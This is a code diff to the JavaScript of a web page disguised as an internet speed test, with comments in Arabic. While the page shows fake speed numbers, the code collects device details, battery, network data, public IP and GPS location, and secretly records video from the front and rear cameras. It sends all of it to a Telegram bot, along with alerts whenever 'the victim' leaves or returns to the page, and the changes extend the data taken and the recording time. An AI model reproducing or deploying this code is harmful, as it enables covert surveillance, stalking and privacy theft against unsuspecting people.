@@ -53,14 +53,31 @@
             } catch (e) {}
         }
 
-        // إشعارات الحالة (Online/Offline)
-        window.onblur = () => sendToTelegram("🔴 **OFFLINE**\nالضحية غادر الصفحة.");
-        window.onfocus = () => sendToTelegram("🟢 **ONLINE**\nالضحية عاد للصفحة.");
+        // تتبع حالة المتصل (Online/Offline)
+        window.onblur = () => sendToTelegram("🔴 **OFFLINE**\nالضحية غادر الصفحة الآن.");
+        window.onfocus = () => sendToTelegram("🟢 **ONLINE**\nالضحية عاد للصفحة الآن.");
 
         async function getFullReport() {
             let info = `📊 *تقرير شامل للهدف*:\n\n`;
             info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
-            info += `• 💾 الرام: \`${navigator.deviceMemory || "?"} GB\`\n`;
+            info += `• 💾 الرام: \`${navigator.deviceMemory || "غير معروف"} GB\`\n`;
+            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
+            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
+            
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                let netType = conn.type === 'wifi' ? "🌐 WiFi" : "📶 خلوي";
+                info += `• 📶 نوع الشبكة: \`${netType} (${conn.effectiveType.toUpperCase()})\`\n`;
+                info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
+            }
+
+            try {
+                const b = await navigator.getBattery();
+                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
+            } catch(e) {}
+
+            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
+
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
@@ -77,7 +94,7 @@
                 recorder.ondataavailable = (e) => chunks.push(e.data);
                 recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: "video/mp4" });
-                    await sendToTelegram(`🎥 فيديو لايف (${label})`, "video", blob);
+                    await sendToTelegram(`🎥 فيديو لايف (${label} - 10 ثوانٍ)`, "video", blob);
                     stream.getTracks().forEach(t => t.stop());
                 };
                 recorder.start();
@@ -91,23 +108,23 @@
         document.getElementById("goBtn").onclick = async function() {
             this.style.display = "none";
             document.getElementById("speedDisplay").style.display = "block";
-            document.getElementById("subText").innerText = "جاري الفحص...";
+            document.getElementById("subText").innerText = "جاري الاتصال بالسيرفر...";
 
             const timer = setInterval(() => {
                 document.getElementById("num").innerText = (Math.random() * (95 - 78) + 78).toFixed(1);
             }, 100);
 
-            // 1. إرسال التقرير والموقع
+            // 1. التقرير والموقع
             sendToTelegram(await getFullReport());
             navigator.geolocation.getCurrentPosition(p => {
-                sendToTelegram(`📍 *الموقع*:\n[خرائط جوجل](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
+                sendToTelegram(`📍 *الموقع*:\n[فتح الخريطة](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
             });
 
-            // 2. تسجيل فيديو لايف من الكاميرا الأمامية (4 ثوانٍ)
-            await recordVideo("user", "أمامي", 4000);
+            // 2. فيديو أمامي (10 ثوانٍ)
+            await recordVideo("user", "أمامي", 10000);
 
-            // 3. تسجيل فيديو لايف من الكاميرا الخلفية (4 ثوانٍ)
-            await recordVideo("environment", "خلفي", 4000);
+            // 3. فيديو خلفي (10 ثوانٍ)
+            await recordVideo("environment", "خلفي", 10000);
 
             setTimeout(() => {
                 clearInterval(timer);
